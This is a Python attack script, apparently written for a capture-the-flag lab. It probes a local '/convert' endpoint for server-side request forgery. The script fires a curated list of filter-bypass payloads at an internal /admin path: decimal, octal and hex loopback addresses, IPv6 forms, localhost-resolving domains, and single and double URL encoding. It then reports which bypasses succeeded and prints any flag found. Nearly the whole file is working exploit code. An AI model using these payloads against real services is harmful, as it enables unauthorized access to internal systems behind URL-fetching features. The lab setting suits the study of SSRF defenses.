import requests
import json
import time

# Base URL and endpoint
BASE_URL = "http://127.0.0.1:33181"
CONVERT_ENDPOINT = f"{BASE_URL}/convert"

# Admin content indicator keywords
admin_indicators = [
    "admin", "panel", "dashboard", "control", "manage", "flag", "FLAG", "secret", "private", "internal"
]

def test_basic_connectivity():
    """Test if the convert endpoint is reachable"""
    print("=" * 70)
    print("TESTING BASIC CONNECTIVITY")
    print("=" * 70)
    
    try:
        # Test with a normal external URL first
        data = {
            "url": "http://example.com",
            "markdown_text": "test connectivity"
        }
        
        response = requests.post(CONVERT_ENDPOINT, json=data, timeout=5)
        print(f"[+] Endpoint reachable! Status: {response.status_code}")
        print(f"[+] Response: {response.text[:200]}")
        return True
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return False

def test_payload(payload):
    """Test a single SSRF payload"""
    # Construct the full URL to test
    test_url = f"{payload}/admin" if not payload.endswith('/admin') else payload
    
    # Prepare request data
    data = {
        "url": test_url,
        "markdown_text": "test"
    }
    
    # Headers
    headers = {
        "Content-Type": "application/json"
    }
    
    try:
        print(f"\n[*] Testing: {test_url}")
        
        response = requests.post(CONVERT_ENDPOINT, json=data, headers=headers, timeout=10)
        response_text = response.text
        status_code = response.status_code
        
        # Check if admin content is present
        admin_content_found = any(indicator.lower() in response_text.lower() for indicator in admin_indicators)
        
        # Determine result
        if admin_content_found:
            result = "ALLOWED"
            print(f"[!] SUCCESS - Status: {status_code}")
            print(f"[!] Admin content detected!")
            print(f"[!] Full response: {response_text}")
        elif "connection refused" in response_text.lower():
            result = "BLOCKED"
            print(f"[-] BLOCKED - Status: {status_code}")
            print(f"[-] Response: {response_text[:150]}...")
        elif "error" in response_text.lower() or status_code >= 400:
            result = "ERROR"
            print(f"[-] ERROR - Status: {status_code}")
            print(f"[-] Response: {response_text[:150]}...")
        else:
            result = "UNKNOWN"
            print(f"[?] UNKNOWN - Status: {status_code}")
            print(f"[?] Response: {response_text[:200]}")
        
        return {
            "payload": test_url,
            "status_code": status_code,
            "result": result,
            "admin_content": admin_content_found,
            "response": response_text
        }
        
    except requests.exceptions.ConnectionError as e:
        print(f"[-] BLOCKED (Connection refused)")
        return {"payload": test_url, "status_code": "N/A", "result": "BLOCKED", "admin_content": False}
    except Exception as e:
        print(f"[-] ERROR: {e}")
        return {"payload": test_url, "status_code": "N/A", "result": "ERROR", "admin_content": False}

def main():
    print()
    print("SSRF BYPASS FILTER FINGERPRINTING")
    print("Target: /convert endpoint")
    print()
    
    # First test connectivity
    if not test_basic_connectivity():
        print("\n[-] Cannot connect to target. Aborting.")
        return
    
    print("\n" + "=" * 70)
    print("TESTING SSRF BYPASS PAYLOADS")
    print("=" * 70)
    
    # Most promising payloads (curated list)
    payloads = [
        # Alternative IP representations
        "http://2130706433",  # Decimal 127.0.0.1
        "http://0177.0.0.1",  # Octal
        "http://0x7f.0.0.1",   # Hex
        "http://127.1",        # Dword
        
        # IPv6
        "http://::1",
        "http://[::1]",
        "http://[::ffff:127.0.0.1]",
        
        # DNS-based
        "http://localhost",
        "http://localtest.me",
        "http://127.0.0.1.xip.io",
        "http://LocalHost",     # Case variation
        "http://127%2e0%2e0%2e1",  # URL encoded
        
        # Encoding tricks
        "http://%68%74%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31",  # Fully encoded
        "http://%2531%2532%2537%252e%2530%252e%2530%252e%2531",     # Double encoded
        
        # Malformed
        "http://user@127.0.0.1",
        "http://127.0.0.1@example.com",
        "http://127.0.0.1#admin",
        "http://127.0.0.1:80",
        
        # Edge cases
        "http://0.0.0.0",
        "http://0",
        "http://[::]",
    ]
    
    successful_payloads = []
    blocked_payloads = []
    error_payloads = []
    
    # Test each payload
    for payload in payloads:
        result = test_payload(payload)
        
        if result["result"] == "ALLOWED":
            successful_payloads.append(result)
        elif result["result"] == "BLOCKED":
            blocked_payloads.append(result)
        elif result["result"] == "ERROR":
            error_payloads.append(result)
        
        time.sleep(0.1)
    
    # Generate report
    print("\n" + "=" * 70)
    print("FINGERPRINTING REPORT")
    print("=" * 70)
    
    print(f"\n[+] Total payloads tested: {len(payloads)}")
    print(f"[+] Successful bypasses: {len(successful_payloads)}")
    print(f"[+] Blocked by filter: {len(blocked_payloads)}")
    print(f"[+] Errors: {len(error_payloads)}")
    
    if successful_payloads:
        print("\n" + "=" * 70)
        print("SUCCESSFUL BYPASS PAYLOADS:")
        print("=" * 70)
        for sp in successful_payloads:
            print(f"\n[!] {sp['payload']}")
            print(f"    Status: {sp['status_code']}")
            if "FLAG{" in sp['response']:
                print(f"    [!] FLAG FOUND: {sp['response']}")
    
    if blocked_payloads:
        print("\n" + "=" * 70)
        print("BLOCKED PAYLOADS (Filter Working):")
        print("=" * 70)
        for bp in blocked_payloads[:10]:
            print(f"  - {bp['payload']}")
        if len(blocked_payloads) > 10:
            print(f"  ... and {len(blocked_payloads) - 10} more")
    
    # Analyze filter type
    print("\n" + "=" * 70)
    print("FILTER TYPE ANALYSIS")
    print("=" * 70)
    
    # Check which techniques work
    decimal_bypass = any('2130706433' in sp['payload'] for sp in successful_payloads)
    octal_bypass = any('0177' in sp['payload'] for sp in successful_payloads)
    hex_bypass = any('0x7f' in sp['payload'] for sp in successful_payloads)
    ipv6_bypass = any('::1' in sp['payload'] for sp in successful_payloads)
    dns_bypass = any('localhost' in sp['payload'].lower() or 'xip.io' in sp['payload'] for sp in successful_payloads)
    encoding_bypass = any('%2e' in sp['payload'] or '%25' in sp['payload'] for sp in successful_payloads)
    
    print(f"\n[+] IP Format Bypasses:")
    print(f"    Decimal notation: {'✓ WORKS' if decimal_bypass else '✗ Blocked'}")
    print(f"    Octal notation: {'✓ WORKS' if octal_bypass else '✗ Blocked'}")
    print(f"    Hex notation: {'✓ WORKS' if hex_bypass else '✗ Blocked'}")
    print(f"    IPv6 notation: {'✓ WORKS' if ipv6_bypass else '✗ Blocked'}")
    
    print(f"\n[+] Encoding Bypasses:")
    print(f"    URL encoding: {'✓ WORKS' if encoding_bypass else '✗ Blocked'}")
    
    print(f"\n[+] DNS Bypasses:")
    print(f"    Alternative DNS: {'✓ WORKS' if dns_bypass else '✗ Blocked'}")
    
    # Determine filter type
    if decimal_bypass or octal_bypass or hex_bypass:
        print(f"\n[!!!] FILTER TYPE: STRING-BASED (IP interpretation bypassed)")
    elif ipv6_bypass:
        print(f"\n[!!!] FILTER TYPE: IPv6 not properly validated")
    elif dns_bypass:
        print(f"\n[!!!] FILTER TYPE: DNS-based with weak blacklist")
    elif encoding_bypass:
        print(f"\n[!!!] FILTER TYPE: Does not decode URL encoding")
    else:
        print(f"\n[!!!] FILTER TYPE: Robust (all tested bypasses blocked)")
    
    print("\n" + "=" * 70)
    print("TEST COMPLETE")
    print("=" * 70)

if __name__ == "__main__":
    main()

